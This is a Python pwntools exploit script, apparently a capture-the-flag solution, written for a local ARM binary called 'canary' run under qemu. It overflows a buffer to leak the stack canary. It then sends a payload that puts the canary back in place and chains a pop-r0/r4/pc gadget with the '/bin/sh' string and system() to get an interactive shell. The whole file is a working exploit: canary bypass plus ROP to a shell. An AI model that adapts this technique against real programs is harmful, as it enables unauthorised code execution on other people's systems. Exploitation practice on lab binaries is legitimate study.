from pwn import *
from pwnlib.term.readline import cancel_search

TARGET = "./canary"
context.log_level = "debug"
context.arch = "arm"


def leak_canary(target_io):
  payload = b"0" * 41
  target_io.sendlineafter(b"> ", payload)
  target_io.recvuntil(payload)
  leak_bits = target_io.recv(3)
  return u32(b"\x00" + leak_bits)


def exec_bin_sh(target_io, target_elf, canary):
  bin_sh_addr = p32(next(target_elf.search(b"/bin/sh")))
  system_addr = p32(target_elf.symbols["system"])
  pop_r0_r4_pc_addr = p32(0x26b7c)

  log.info("canary: 0x%x" % canary)
  log.info("bin_sh_addr: 0x%x" % u32(bin_sh_addr))
  log.info("system_addr: 0x%x" % u32(system_addr))

  payload = b"0" * 40
  payload += p32(canary)
  payload += b"1" * 12
  payload += pop_r0_r4_pc_addr
  payload += bin_sh_addr
  payload += b"2" * 4
  payload += system_addr
  target_io.sendline(payload)
  target_io.sendlineafter(b"> ", b"")


def main():
  target_elf = ELF(TARGET)
  target_io = process(["qemu-arm", TARGET])
  canary = leak_canary(target_io)
  exec_bin_sh(target_io, target_elf, canary)
  target_io.interactive()


if __name__ == "__main__":
  main()
